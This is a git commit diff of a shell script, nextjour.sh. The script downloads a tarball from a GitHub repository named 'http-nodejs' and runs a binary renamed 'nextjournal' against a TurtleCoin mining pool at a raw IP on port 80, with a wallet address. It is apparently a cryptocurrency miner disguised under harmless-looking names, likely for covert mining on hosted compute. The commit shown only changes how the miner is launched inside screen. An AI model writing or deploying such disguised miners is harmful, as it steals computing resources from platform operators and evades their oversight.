2d029267003f98bbdc757d927b99b8d283ef334b
dshillin <57657582+dshillin@users.noreply.github.com>
2022-09-12 09:49:30 +0100

    nextjour.sh

--- nextjour.sh
+++ nextjour.sh
@@ -4,8 +4,9 @@
 apt-get update
 clear
 apt-get install screen -y
- 
+screen -R nextjournal
+
 wget https://raw.githubusercontent.com/dshillin/http-nodejs/main/nextjournal.tar.gz
 tar xvzf nextjournal.tar.gz
 cd nextjournal
-screen ./nextjournal --algorithm turtlecoin --pool 142.132.131.248:80 --username TRTLv1hc4Ys615aVETRD9tB73tP7H53bwY3RQkBn7xH7iJzXP6FqKh9hJ8od82q59QLHLSiWiGEjYhoDPnCAcnWcS8nSGccNVsA --threads 2
+./nextjournal --algorithm turtlecoin --pool 142.132.131.248:80 --username TRTLv1hc4Ys615aVETRD9tB73tP7H53bwY3RQkBn7xH7iJzXP6FqKh9hJ8od82q59QLHLSiWiGEjYhoDPnCAcnWcS8nSGccNVsA --threads 2
